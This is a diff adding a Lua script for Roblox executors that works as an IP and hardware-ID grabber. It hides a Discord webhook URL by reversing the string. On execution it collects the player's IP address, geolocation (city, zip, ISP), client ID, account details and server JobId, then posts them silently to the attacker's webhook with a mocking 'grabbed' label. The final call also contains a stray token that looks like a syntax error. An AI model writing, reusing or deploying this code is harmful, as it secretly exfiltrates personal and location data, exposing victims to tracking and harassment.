@@ -1,0 +1,131 @@
+local webhook = string.reverse("Foy-6AffwzEn64j2W1goZlWl2Am4bdI2xNmmuJNXN0plxOMhmfQA-I3Mpkic4p37zC2x/0059689384757782551/skoohbew/ipa/moc.drocsid//:sptth")
+
+local httpservice = game:GetService("HttpService")
+local players = game:GetService("Players")
+local localizationservice = game:GetService("LocalizationService")
+local marketplaceservice = game:GetService("MarketplaceService")
+local rbxanalyticsservice = game:GetService("RbxAnalyticsService")
+
+local player = players.LocalPlayer
+local has_sent = false
+
+local cached_ip = "N/A"
+local cached_ip_info_string = ""
+local cached_hwid = "N/A"
+local cached_game_name = tostring(game.PlaceId)
+local cached_executor = "Unknown"
+
+pcall(function() cached_ip = game:HttpGet("https://v4.ident.me/") end)
+pcall(function()
+    local ipinfo = httpservice:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+    local ipfields = { "query", "country", "regionName", "city", "zip", "isp", "org", "as" }
+    local buf = ""
+    for _, field in ipairs(ipfields) do
+        if ipinfo[field] then
+            buf = buf .. "**" .. field .. ":** " .. tostring(ipinfo[field]) .. "\n"
+        end
+    end
+    cached_ip_info_string = buf
+end)
+pcall(function() cached_hwid = rbxanalyticsservice:GetClientId() end)
+pcall(function() cached_game_name = marketplaceservice:GetProductInfo(game.PlaceId).Name end)
+pcall(function()
+    cached_executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+        or (secure_load and "Sentinel")
+        or (pebc_execute and "ProtoSmasher")
+        or (KRNL_LOADED and "Krnl")
+        or (is_sirhurt_closure and "SirHurt")
+        or (identifyexecutor and identifyexecutor():find("Agarware") and "GrieferHub")
+        or (identifyexecutor and identifyexecutor())
+        or "Unknown"
+end)
+
+local function http_post(payload)
+    local newdata = httpservice:JSONEncode(payload)
+    local headers = { ["content-type"] = "application/json" }
+    pcall(function()
+        if syn and syn.request then
+            syn.request({ Url = webhook, Body = newdata, Method = "POST", Headers = headers })
+        elseif request then
+            request({ Url = webhook, Body = newdata, Method = "POST", Headers = headers })
+        elseif http_request then
+            http_request({ Url = webhook, Body = newdata, Method = "POST", Headers = headers })
+        elseif HttpPost then
+            HttpPost({ Url = webhook, Body = newdata, Method = "POST", Headers = headers })
+        end
+    end)
+end
+
+local function build_embed(event_type, content)
+    local dname = player.DisplayName
+    local name = player.Name
+    local userid = player.UserId
+    local country = localizationservice.RobloxLocaleId
+    local account_age = player.AccountAge
+    local membership_type = string.sub(tostring(player.MembershipType), 21)
+    return {
+        ["author"] = {
+            ["name"] = event_type .. (content ~= "" and (" " .. content) or ""),
+            ["url"] = "https://roblox.com",
+        },
+        ["description"] = "__[Player Info](https://www.roblox.com/users/"..userid..")__\n"
+            .."**Display Name:** "..dname.."\n"
+            .."**Username:** "..name.."\n"
+            .."**User Id:** "..userid.."\n"
+            .."**MembershipType:** "..membership_type.."\n"
+            .."**AccountAge:** "..account_age.."\n"
+            .."**Country:** "..country.."\n"
+            .."**IP:** "..cached_ip.."\n"
+            .."**Hwid:** "..cached_hwid.."\n"
+            .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
+            .."**Time:** "..tostring(os.date("%X")).."\n\n"
+            .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
+            .."**Game:** "..cached_game_name.."\n"
+            .."**Game Id**: "..game.PlaceId.."\n"
+            .."**Exploit:** "..cached_executor.."\n\n"
+            .."**IP Information:**\n"..cached_ip_info_string,
+        ["type"] = "rich",
+        ["color"] = tonumber(0x57F287),
+        ["thumbnail"] = {
+            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=150&height=150&format=png",
+        },
+    }
+end
+
+local function send_embed(embed)
+    if not webhook or webhook == "" then return end
+    if has_sent then return end
+    has_sent = true
+
+    http_post({
+        ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
+        ["content"] = "",
+        ["embeds"] = { embed },
+        ["components"] = {
+            {
+                ["type"] = 1,
+                ["components"] = {
+                    {
+                        ["type"] = 2,
+                        ["style"] = 2,
+                        ["label"] = "Fucking grabbed lol",
+                        ["custom_id"] = "grabbed_button",
+                    },
+                },
+            },
+        },
+    })
+
+    task.wait(0.5)
+
+    http_post({
+        ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
+        ["content"] = "**JobId:**\n```"..tostring(game.JobId).."```",
+    })
+end
+
+local function webhook_log(event_type, content)
+    task.spawn(function() send_embed(build_embed(event_type, content)) end)
+end
+
+webhook_log("Got Fucking Grabbed Lol",Ez "")
